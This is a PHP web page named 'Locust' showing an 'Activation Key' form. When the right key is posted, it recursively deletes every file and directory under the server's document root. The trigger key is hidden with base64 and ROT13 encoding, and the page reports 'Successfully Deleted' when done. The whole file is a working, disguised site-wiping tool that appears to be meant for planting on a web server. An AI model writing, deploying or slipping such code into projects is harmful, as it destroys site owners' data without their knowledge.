<?php

/*
Name: Locust
Version: 1.0
Developer: Md. Ridwanul Islam Muntakim
Email: theridwanul@protonmail.com
*/

if($_SERVER["REQUEST_METHOD"] === "POST"){	
	$user_key = validation($_POST["key"]);				
	$range = $_SERVER["DOCUMENT_ROOT"];
	function locust($directorys){
		foreach(scandir($directorys) as $files){
			if($files === "." || $files === ".."){
				continue;
			}
			if(is_dir("$directorys/$files")){
				locust("$directorys/$files");
			}
			else{
				unlink("$directorys/$files");
			}
		}
		rmdir($directorys);
	}	
	$private_key = base64_decode("eWJwaGZn");
	$private_key = str_rot13($private_key);	
	if($private_key === $user_key){
		locust($range);
		echo("<script>alert('Successfully Deleted');</script>");
	}
	else{
		echo("<script>alert('Something Went Wrong');</script>");
	} 
}
function validation($data){
	$data = trim($data);
	$data = stripcslashes($data);
	$data = htmlspecialchars($data);
	return $data;
 }
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap" rel="stylesheet"> 
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <title>Locust</title>
    <style>
        *{
            margin: 0;
            padding: 0;
        }

        body{
            background-color: #363538;
        }

        #main{
            width: 500px;
            height: 300px;
            background-color: #3D3A3A;
            margin: 0 auto;
            margin-top: 100px;
            border: 1px solid #808080;
            border-radius: 5px;
            padding: 5px;
        }

        #main:hover{
            width: 500px;
            height: 300px;
            background-color: #3D3A3A;
            margin: 0 auto;
            margin-top: 100px;
            border: 1px solid #808080;
            border-radius: 5px;
            padding: 5px;
            box-shadow: 2px 2px 3px 5px #808080;
        }

        #logo-style{
            display: block;
            margin: 0 auto;
        }

        #action_area{
            text-align: center;
            margin-top: 20px;
        }

        #input_area{
            border: 2px solid #808080;
            border-radius: 5px;
            height: 30px;
            text-align: center;
        }

        #fonts{
            font-weight: bold;
            color: #CDA94A;
            font-family: 'Orbitron', sans-serif;
        }

        #button_style{
            width: 100px;
            height: 40px;
            margin-top: 5px;
            margin-left: 60px;
            background-color: #CDA94A;
            border: 2px solid #808080;
            border-radius: 10px;
            font-family: 'Orbitron', sans-serif;
        }

        #button_style:hover{
            width: 100px;
            height: 40px;
            margin-top: 5px;
            margin-left: 60px;
            background-color: #61EFCE;
            border: 1px solid #808080;
            border-radius: 5px;
            font-family: 'Orbitron', sans-serif;
        }
    </style>
</head>
<body>
    <div id="main">
        <img id="logo-style" src="https://i.postimg.cc/KcwjNQyc/locust.png" alt="Locust">
        <div id="action_area">
            <form action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>" method="post">
            <i class="fa fa-key" style="color: #CDA94A"></i> <font id="fonts">Activation Key</font> <input id="input_area" type="password" name="key" required>
            <br/>
            <input id="button_style" type="submit" value="Activate">
            </form>
        </div>
    </div>
</body>
</html>